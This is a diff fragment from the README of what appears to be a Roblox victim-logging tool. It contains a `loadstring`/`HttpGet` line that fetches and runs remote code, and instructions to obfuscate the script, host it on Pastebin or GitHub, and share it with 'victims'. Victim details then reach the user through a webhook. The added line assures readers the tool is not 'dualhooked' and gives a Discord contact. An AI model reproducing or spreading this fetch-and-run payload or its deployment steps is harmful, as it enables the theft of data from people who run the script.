@@ -9,3 +9,4 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ethz07/ethzScripts-AD
 ```
 * after u finish it obfuscate the code then make it executable in pastebin github etc.
 * after share it to your victims if they execute your code ur gonna get a webhook message and read the includes here u will see details.
+* also its not dualhooked if u believe its dualhooked my Discord: **_ethz**
